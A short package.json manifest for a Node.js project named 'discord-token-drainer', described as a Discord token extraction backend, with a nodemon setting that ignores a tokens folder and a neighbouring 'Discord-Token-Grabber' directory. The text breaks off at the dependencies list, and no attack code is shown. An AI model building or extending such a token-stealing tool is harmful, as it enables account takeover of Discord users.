{
  "name": "discord-token-drainer",
  "version": "1.0.0",
  "description": "Clean Discord token extraction backend",
  "main": "server.js",
  "scripts": {
    "start": "node server.js",
    "dev": "nodemon server.js"
  },
  "nodemonConfig": {
    "ignore": [
      "*.json",
      "tokens/*",
      "../Discord-Token-Grabber/*"
    ]
  },
  "dependencies": {
